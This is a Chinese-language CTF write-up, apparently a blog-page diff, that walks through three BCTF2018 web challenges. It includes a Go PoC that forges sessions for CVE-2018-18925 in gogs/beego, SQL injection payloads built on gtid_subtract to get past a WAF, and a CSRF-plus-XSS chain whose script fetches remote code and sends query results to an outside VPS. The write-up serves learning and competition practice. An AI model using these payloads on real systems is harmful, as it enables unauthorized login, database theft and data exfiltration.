@@ -71,7 +71,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="ctf,">
 
 
 
@@ -91,17 +91,30 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="description" content="前言总结一下BCTF2018的解题过程，这篇博客只有其中三道题，包括但不仅限于gogs框架的任意用户登录漏洞、SQL报错注入、XSS。 虽然自己做的时候都没做出来，但在看wp的过程中回顾自己的思路时，从中发现了自己的思路偏在哪里了，有哪些从前没想过的切入点。">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2018/10/25/hello-world/index.html">
+<meta property="og:title" content="BCTF2018-web(1)">
+<meta property="og:url" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/index.html">
 <meta property="og:site_name" content="像风">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta property="og:description" content="前言总结一下BCTF2018的解题过程，这篇博客只有其中三道题，包括但不仅限于gogs框架的任意用户登录漏洞、SQL报错注入、XSS。 虽然自己做的时候都没做出来，但在看wp的过程中回顾自己的思路时，从中发现了自己的思路偏在哪里了，有哪些从前没想过的切入点。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-30T08:20:48.853Z">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/9.png">
+<meta property="og:image" content="c:/Users/dell/AppData/Local/Temp/1543840568134.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/10.png">
+<meta property="og:updated_time" content="2018-12-03T14:35:13.032Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="twitter:title" content="BCTF2018-web(1)">
+<meta name="twitter:description" content="前言总结一下BCTF2018的解题过程，这篇博客只有其中三道题，包括但不仅限于gogs框架的任意用户登录漏洞、SQL报错注入、XSS。 虽然自己做的时候都没做出来，但在看wp的过程中回顾自己的思路时，从中发现了自己的思路偏在哪里了，有哪些从前没想过的切入点。">
+<meta name="twitter:image" content="http://yoursite.com/2018/12/03/BCTF2018-web-1/1.png">
 
 
 
@@ -131,13 +144,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/25/hello-world/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/03/BCTF2018-web-1/">
 
 
 
 
 
-  <title>Hello World | 像风</title>
+  <title>BCTF2018-web(1) | 像风</title>
   
 
 
@@ -296,7 +309,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/03/BCTF2018-web-1/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xiangfeng">
@@ -313,7 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hello World</h1>
+          <h1 class="post-title" itemprop="name headline">BCTF2018-web(1)</h1>
         
 
         <div class="post-meta">
@@ -325,8 +338,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-25T08:37:15+08:00">
-                2018-10-25
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-03T16:25:11+08:00">
+                2018-12-03
               </time>
             
 
@@ -343,7 +356,7 @@
 
           
           
-             <span id="/2018/10/25/hello-world/" class="leancloud_visitors" data-flag-title="Hello World">
+             <span id="/2018/12/03/BCTF2018-web-1/" class="leancloud_visitors" data-flag-title="BCTF2018-web(1)">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -374,16 +387,88 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总结一下BCTF2018的解题过程，这篇博客只有其中三道题，包括但不仅限于gogs框架的任意用户登录漏洞、SQL报错注入、XSS。</p>
+<p>虽然自己做的时候都没做出来，但在看wp的过程中回顾自己的思路时，从中发现了自己的思路偏在哪里了，有哪些从前没想过的切入点。</p>
 <a id="more"></a>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>输入一个不存在的url，看到404报错，提示：</p>
+<p><code>Powered by beego 1.7.2</code></p>
+<p>思路是老大提供的</p>
+<p>关于gitea/gogs的CVE-2018-18925/6任意用户登录/代码执行漏洞</p>
+<p>go-macaron(<a href="https://github.com/go-macaron/session" target="_blank" rel="noopener">https://github.com/go-macaron/session</a> version&lt;0.4.0)</p>
+<p>beego(<a href="https://github.com/astaxie/beego" target="_blank" rel="noopener">https://github.com/astaxie/beego</a> version&lt;1.11.0)</p>
+<p>都存在这个问题，p神的vulhub中也有这个洞的docker：<a href="https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925" target="_blank" rel="noopener">CVE-2018-18925</a> </p>
+<p>以文件存储session，且sessionid没有过滤<code>./</code>的时候导致可以用任意文件作为session</p>
+<p>所以这道题可以在头像上传处上传伪造的session文件，再用sessionid包含即可伪造身份为admin </p>
+<p>这里不能使用之前的poc构造session文件了，要改一下，我当时做题时就不知道怎么改，现在学到了一些思路。</p>
+<p>先上传一个0B的图片，把session设置成该地址，登陆后下载头像，解析其中的字段类型，发现两项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UID int</span><br><span class="line">username string</span><br></pre></td></tr></table></figure>
+<p>可以直接改CVE-2018-18925的poc为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;bytes&quot;</span><br><span class="line">    &quot;encoding/gob&quot;</span><br><span class="line">    &quot;encoding/hex&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io/ioutil&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func EncodeGob(obj map[interface&#123;&#125;]interface&#123;&#125;) ([]byte, error) &#123;</span><br><span class="line">    for _, v := range obj &#123;</span><br><span class="line">        gob.Register(v)</span><br><span class="line">    &#125;</span><br><span class="line">    buf := bytes.NewBuffer(nil)</span><br><span class="line">    err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line">    return buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    var uid int64 = 1</span><br><span class="line">    obj := map[interface&#123;&#125;]interface&#123;&#125;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;UID&quot;: uid&#125;</span><br><span class="line">    data, err := EncodeGob(obj)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    err = ioutil.WriteFile(&quot;test2.png&quot;, data, 0777)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    edata := hex.EncodeToString(data)</span><br><span class="line">    fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跑完poc得到一段十进制数据</p>
+<img src="/2018/12/03/BCTF2018-web-1/1.png">
+<p>放到<a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a>的<code>From HEX</code>功能中，存个poc.jpg</p>
+<img src="/2018/12/03/BCTF2018-web-1/2.png">
+<p>上传poc.jpg后修改sessionid为上传的返回地址<code>../../../../../../go/src/github.com/checkin/website/static/img/avatar/xxxxxxx.png</code>，登陆到admin用户，访问Admin Panel得到flag</p>
+<img src="/2018/12/03/BCTF2018-web-1/3.png">
+<h1 id="babySQLiSPA"><a href="#babySQLiSPA" class="headerlink" title="babySQLiSPA"></a>babySQLiSPA</h1><p>这道题我第一眼看了以为是二次注入，然后在二次注入的路上越走越远，直到这道题官方的hint给了waf。</p>
+<p>注册用户名的时候发现限定了<code>[a-zA-Z0-9]</code>，把其它的都过滤了， 所以没法二次注入了。</p>
+<p>r3kapig的writeup中提到，在看网页源码时发现是用webpack打包的，用webpack打包过后会生成.map文件，于是访问main.dfa730c5.js.map，在其中可以发现两个没有用到的api：</p>
+<img src="/2018/12/03/BCTF2018-web-1/4.png">
+<img src="/2018/12/03/BCTF2018-web-1/5.png">
+<p>searchHints中用到的captcha就是从getCaptcha中得到的，于是：</p>
+<img src="/2018/12/03/BCTF2018-web-1/6.png">
+<p>/api/hints可以注入，且报错回显。</p>
+<p>看一下给的WAF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function checkHint (hint) &#123;</span><br><span class="line">  return ! / |;|\+|-|\*|\/|&lt;|&gt;|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`|gtid_subset|hash|json|st\_|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|sleep|benchmark/ig.test(hint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用报错函数<code>gtid_subtract()</code>绕过</p>
+<p><code>hints:&#39;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((table_schema=database()))),&#39;&#39;))or&#39;</code></p>
+<img src="/2018/12/03/BCTF2018-web-1/7.png">
+<p>但发现返回的表名都是乱码，因为GTID_SUBTRACT()的报错信息有长度限制，最多140字节，Nu1L是限制表名长度来提取的，长度为30的时候拿到flag表”vhEFfFlLlLaAAaaggIiIIsSSHeReEE “</p>
+<p>payload：<code>hint=&#39;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord(&#39;j&#39;)^ord(&#39;t&#39;)))),&#39;&#39;))or&#39;</code></p>
+<p>这里也可以引入reverse()函数倒序查看表名</p>
+<img src="/2018/12/03/BCTF2018-web-1/8.png">
+<p>然后再爆列名：<code>hint=&#39;||gtid_subtract((select(concat(column_name))from(information_schema.columns)where(table_name=&#39;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#39;)),&#39;&#39;)#</code></p>
+<p>报错信息：<code>{&quot;error&quot;:&quot;Malformed GTID set specification &#39;ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO&#39;.&quot;}</code></p>
+<p>最后的payload：<code>hints:&#39;||gtid_subtract((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),&#39;&#39;)#</code>.</p>
+<img src="/2018/12/03/BCTF2018-web-1/9.png">
+<p>这道题主要没想到sql注入的位置，学习了一种报错注入用的函数。</p>
+<h1 id="SEAFARING1"><a href="#SEAFARING1" class="headerlink" title="SEAFARING1"></a>SEAFARING1</h1><p>做这道题时发现login处有个XSS，之前没做过XSS的题，登陆的时候需要验证码，也没发现有什么用。</p>
+<p>还有一个robots.txt提示文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/handle_message.php</span><br></pre></td></tr></table></figure>
+<p><code>view-source:http://seafaring.xctf.org.cn:9999/admin</code>可以看到后台的部分源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function view_uid(uid) &#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: &quot;POST&quot;,</span><br><span class="line">            url: &quot;/admin/handle_message.php&quot;,</span><br><span class="line">            data: &#123;&quot;token&quot;: csrf_token, &quot;action&quot;: &quot;view_uid&quot;, &quot;uid&quot;: uid&#125;,</span><br><span class="line">            dataType: &quot;json&quot;,</span><br><span class="line">            success: function (data) &#123;</span><br><span class="line">                if (!data[&quot;error&quot;]) &#123;</span><br><span class="line">                    data = data[&apos;result&apos;];</span><br><span class="line">                    var Status = &apos;&apos;;</span><br><span class="line">                    $(&apos;#timestamp&apos;).text(data[&apos;timestamp&apos;]);</span><br><span class="line">                    $(&apos;#username&apos;).text(data[&apos;user_name&apos;]);</span><br><span class="line">                    $(&apos;#message&apos;).text(data[&apos;message&apos;]);</span><br><span class="line">                    document.getElementById(&quot;replyuid&quot;).value=data[&apos;uid&apos;];</span><br><span class="line">                    if (parseInt(data[&apos;is_checked&apos;]) == 1) &#123;</span><br><span class="line">                        Status = &apos;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&apos;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        Status = &apos;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&apos;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    document.getElementById(&quot;status&quot;).innerHTML = Status;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                    alert(&apos;Error: &apos; + data[&quot;error&quot;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>进到<code>/admin/handle_message.php</code>中，提示：</p>
+<p><code>{&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;CSRFToken &#39;&#39;is not correct&quot;}</code></p>
+<p>注意到error双引号内部有个’’，猜测传入的csrftoken可能直接输出到了页面中 </p>
+<p>结合源码，发现csrftoken通过token参数使用post方法传入</p>
+<p><img src="C:\Users\dell\AppData\Local\Temp\1543840568134.png" alt="1543840568134"></p>
+<p>传入后会回显token值，存在反射型XSS，构造类似<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>的payload时会发现对’/‘转义了。</p>
+<p>接下来构造一个页面让管理员访问，这道题的评论链接会被bot机器人主动访问，因此构造csrf的html页面让bot访问。</p>
+<p>之前发现了’/‘被转义了，所以这里我们使用svg或img进行xss，同时为了避免引号的问题，使用fromCharCode()方法或者使用base64编码再用atob()函数解码的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(numX,numX,...,numX)</span><br><span class="line">fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">numX	一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</span><br></pre></td></tr></table></figure>
+<p>html页面为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    window.onload =function()&#123;</span><br><span class="line">      document.getElementById(&quot;f&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;form method=&quot;post&quot; action=&quot;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&quot; id=&quot;f&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input name=&quot;token&quot; value=&quot;&lt;body&gt;&lt;img src=x onerror=eval(atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL0dDNkRURz8nK01hdGgucmFuZG9tKCk=&apos;))&gt;&lt;/body&gt;&quot;&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的value内容也可以替换为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;img src=x onerror=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,41,46,115,114,99,61,39,104,116,46,99,110,47,69,121,76,83,53,99,103,39))&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>注释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL0dDNkRURz8nK01hdGgucmFuZG9tKCk=&apos;)</span><br><span class="line"></span><br><span class="line">&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xsspt.com/GC6DTG?&apos;+Math.random()&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,41,46,115,114,99,61,39,104,116,46,99,110,47,69,121,76,83,53,99,103,39)</span><br><span class="line"></span><br><span class="line">&quot;document.body.appendChild(document.createElement(&apos;script&apos;)).src=&apos;ht.cn/EyLS5cg&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p>这里的链接地址是在xss平台上面建立的项目，引入js文件</p>
+<img src="/2018/12/03/BCTF2018-web-1/10.png">
+<p>当然也可以把js文件放在自己的vps上面</p>
+<p>外部引入的js文件（Nu1l的师傅写的 ）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function req(url,data)&#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(&quot;POST&quot;,url,false);</span><br><span class="line">    xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">    xhr.send(data);</span><br><span class="line">    var resp = xhr.responseText;</span><br><span class="line">    return resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getcsrf()&#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(&quot;GET&quot;,&quot;http://seafaring.xctf.org.cn:9999/admin/index.php&quot;,false);</span><br><span class="line">    xhr.send();</span><br><span class="line">    var res = xhr.responseText;</span><br><span class="line">    var csrftoken = res.match(/csrf_token = \&quot;([a-z0-9]*)\&quot;/ig)[0].split(&apos;= &quot;&apos;)[1].replace(&apos;&quot;&apos;,&apos;&apos;);</span><br><span class="line">    return csrftoken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function send(data)&#123;</span><br><span class="line">    location.href = &quot;http://47.95.10.238/bctf.php?data=&quot;+escape(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var ress = req(&quot;http://172.20.0.2:6379/&quot;,&quot;token=&quot;+getcsrf()+&quot;&amp;action=view_unreads&amp;status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23&quot;);</span><br><span class="line"></span><br><span class="line">send(ress);</span><br></pre></td></tr></table></figure>
+<p>send()函数中的href是自己的vps</p>
+<p>发现返回了<code>sqlquery debug</code>信息 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked,message FROM feedbacks where uid=&apos;1&apos; ORDER BY id DESC &quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>有一个接口存在数字型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked FROM feedbacks  where is_checked=1\\&apos; ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>爆表爆字段最后拿flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;admin,f111111ag,feedbacks&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;flllllag&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xss是很久之前看的了，一直没有像这样进行一次系统的利用过，这次算是了了一桩心愿</p>
+<p>大二上学期接下来的日子准备复习四级，复习期末，学一些渗透姿势和python，闲暇时打打ctf，就过去了</p>
+<p>十二月了，要买回家的车票了，这次不想坐飞机，看不到沈阳的雪了</p>
+<p>周末看了将夜，很久前看过的小说拍剧了，很好看</p>
+<p>红墙白雪，要你喜欢。</p>
 
       
     </div>
@@ -399,6 +484,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
+      
 
       
       
@@ -408,15 +499,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/11/29/NCTF-2018/" rel="next" title="NCTF 2018">
+                <i class="fa fa-chevron-left"></i> NCTF 2018
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/25/hexo从零搭建全过程/" rel="prev" title="hexo 从零搭建全过程">
-                hexo 从零搭建全过程 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -558,7 +649,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkin"><span class="nav-number">2.</span> <span class="nav-text">checkin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babySQLiSPA"><span class="nav-number">3.</span> <span class="nav-text">babySQLiSPA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SEAFARING1"><span class="nav-number">4.</span> <span class="nav-text">SEAFARING1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">5.</span> <span class="nav-text">后记</span></a></li></ol></div>
             
 
           </div>
